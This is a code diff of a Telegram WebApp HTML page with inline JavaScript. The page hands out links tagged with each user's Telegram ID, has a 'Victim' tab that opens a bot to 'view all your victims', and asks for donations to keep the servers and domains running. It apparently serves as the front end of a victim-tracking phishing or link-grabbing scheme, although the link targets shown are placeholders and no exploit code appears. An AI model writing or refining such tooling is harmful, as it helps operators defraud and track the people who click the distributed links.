@@ -157,13 +157,29 @@
 <body>
 
 <div id="app">
-  <!-- Sections -->
-  <section id="home" class="active" aria-label="Home section"></section>
-  <section id="premium" aria-label="Premium links section"></section>
+  <!-- Home Section -->
+  <section id="home" class="active" aria-label="Home section">
+    <h1>Home Section</h1>
+    <div id="home-links">
+      <!-- Links dynamically inserted here -->
+    </div>
+  </section>
+
+  <!-- Premium Section -->
+  <section id="premium" aria-label="Premium links section">
+    <h1>Premium Section</h1>
+    <div id="premium-links">
+      <!-- Links dynamically inserted here -->
+    </div>
+  </section>
+
+  <!-- Victim Section -->
   <section id="victim" aria-label="Victim section">
     <h2>Open this bot to view all your victims</h2>
     <button id="open-victim-bot">👉 Open Bot</button>
   </section>
+
+  <!-- Donate Section -->
   <section id="donate" aria-label="Donate section">
     <h2>Support Us with Donations</h2>
     <p>To promote our links and maintain servers and domain names, please consider donating.</p>
@@ -177,28 +193,161 @@
 <!-- Navigation -->
 <nav aria-label="Primary navigation">
   <button id="nav-home" class="active" aria-controls="home" aria-selected="true" role="tab">
-    <!-- Home icon -->
     <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M3 12L12 3l9 9v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-9z"/></svg>
     Home
   </button>
   <button id="nav-premium" aria-controls="premium" aria-selected="false" role="tab">
-    <!-- Star icon -->
     <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
     Premium
   </button>
   <button id="nav-victim" aria-controls="victim" aria-selected="false" role="tab">
-    <!-- User icon -->
     <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><circle cx="12" cy="7" r="4"/><path d="M5.5 21a7 7 0 0 1 13 0"/></svg>
     Victim
   </button>
   <button id="nav-donate" aria-controls="donate" aria-selected="false" role="tab">
-    <!-- Donate icon -->
     <svg viewBox="0 0 24 24" stroke="currentColor" fill="none"><path d="M12 1v22m-7-7h14"/></svg>
     Donate
   </button>
 </nav>
 
-<script src="premiumlist.js"></script>
-<script src="main.js"></script>
+<script>
+  // Safe Telegram WebApp Init
+  const tg = window.Telegram?.WebApp;
+  if(tg) tg.expand();
+
+  // Get Telegram User ID safely
+  const telegramId = tg?.initDataUnsafe?.user?.id || "unknown_user";
+  console.log("Telegram User ID:", telegramId);
+
+  // Sample links data for Home and Premium sections
+  const homeLinksData = [
+    {
+      name: "Example Link 1",
+      image: "https://via.placeholder.com/60",
+      url: "https://example.com/link1"
+    },
+    {
+      name: "Example Link 2",
+      image: "https://via.placeholder.com/60",
+      url: "https://example.com/link2"
+    }
+  ];
+
+  const premiumLinksData = [
+    {
+      name: "Premium Link 1",
+      image: "https://via.placeholder.com/60",
+      url: "https://premium.com/link1"
+    },
+    {
+      name: "Premium Link 2",
+      image: "https://via.placeholder.com/60",
+      url: "https://premium.com/link2"
+    }
+  ];
+
+  // Function to build and insert links with telegramId in URL query param
+  function buildLinks(sectionId, linksData) {
+    const container = document.getElementById(sectionId + "-links");
+    container.innerHTML = ""; // Clear existing
+
+    if(linksData.length === 0) {
+      container.innerHTML = "<p>No links available.</p>";
+      return;
+    }
+
+    linksData.forEach(link => {
+      // Construct URL with telegramId as query param if available
+      let url;
+      try {
+        url = new URL(link.url);
+      } catch(e) {
+        console.error("Invalid URL for link:", link);
+        return;
+      }
+
+      if (telegramId && telegramId !== "unknown_user") {
+        url.searchParams.set('userid', telegramId);
+      }
+
+      const card = document.createElement("div");
+      card.className = "link-card";
+
+      const img = document.createElement("img");
+      img.src = link.image;
+      img.alt = link.name;
+
+      const info = document.createElement("div");
+      info.className = "link-info";
+
+      const name = document.createElement("div");
+      name.className = "link-name";
+      name.textContent = link.name;
+
+      const linkEl = document.createElement("a");
+      linkEl.className = "link-url";
+      linkEl.href = url.toString();
+      linkEl.textContent = url.toString();
+      linkEl.target = "_blank";
+      linkEl.rel = "noopener noreferrer";
+
+      // Copy button
+      const copyBtn = document.createElement("button");
+      copyBtn.className = "copy-btn";
+      copyBtn.textContent = "Copy";
+      copyBtn.addEventListener("click", () => {
+        navigator.clipboard.writeText(url.toString()).then(() => {
+          copyBtn.textContent = "Copied!";
+          setTimeout(() => { copyBtn.textContent = "Copy"; }, 1500);
+        });
+      });
+
+      info.appendChild(name);
+      info.appendChild(linkEl);
+
+      card.appendChild(img);
+      card.appendChild(info);
+      card.appendChild(copyBtn);
+
+      container.appendChild(card);
+    });
+  }
+
+  // Build links on page load
+  buildLinks("home", homeLinksData);
+  buildLinks("premium", premiumLinksData);
+
+  // Navigation buttons event listener
+  const navButtons = document.querySelectorAll("nav button");
+  navButtons.forEach(btn => {
+    btn.addEventListener("click", () => {
+      // Remove active class from all buttons and hide all sections
+      navButtons.forEach(b => {
+        b.classList.remove("active");
+        const sec = document.getElementById(b.getAttribute("aria-controls"));
+        if (sec) sec.classList.remove("active");
+        b.setAttribute("aria-selected", "false");
+      });
+
+      // Add active class to clicked button and show corresponding section
+      btn.classList.add("active");
+      btn.setAttribute("aria-selected", "true");
+      const targetId = btn.getAttribute("aria-controls");
+      const targetSection = document.getElementById(targetId);
+      if (targetSection) targetSection.classList.add("active");
+    });
+  });
+
+  // Victim bot open button handler
+  const victimBtn = document.getElementById("open-victim-bot");
+  if (victimBtn) {
+    victimBtn.addEventListener("click", () => {
+      const victimBotUsername = "intelligentvictimbot"; // Change if needed
+      const url = `https://t.me/${victimBotUsername}`;
+      window.open(url, "_blank");
+    });
+  }
+</script>
+
 </body>
 </html>
